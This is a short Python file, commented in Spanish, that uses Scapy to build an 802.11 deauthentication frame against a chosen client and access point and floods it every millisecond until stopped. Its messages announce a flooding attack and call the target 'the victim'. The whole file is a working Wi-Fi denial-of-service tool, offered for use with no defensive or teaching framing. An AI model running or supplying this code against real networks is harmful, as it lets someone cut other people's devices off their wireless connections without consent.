from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

class DeauthAttacker:
    @staticmethod
    def start_attack(interface: str, bssid: str, client: str):
        # Aseguramos formato MAC correcto
        client = client.replace("-", ":")
        
        # Construimos el paquete
        # Usamos reason=4 (Disassociated due to inactivity) que a veces es más efectivo
        dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
        paquete = RadioTap() / dot11 / Dot11Deauth(reason=4)

        print(f"\n[\033[91m!\033[0m] INICIANDO ATAQUE DE INUNDACIÓN")
        print(f"[*] Objetivo: {client} | Canal: (Fijo en la tarjeta)")
        print("[*] Pulsa \033[1mCtrl+C\033[0m para detener el ataque.")

        try:
            # loop=1: Envía el paquete sin parar
            # inter=0.001: Envía un paquete cada 1 milisegundo (Ráfaga pura)
            sendp(paquete, iface=interface, loop=1, inter=0.001, verbose=False)
        except KeyboardInterrupt:
            print("\n[\033[92m+\033[0m] Ataque detenido. La víctima debería recuperar la conexión.")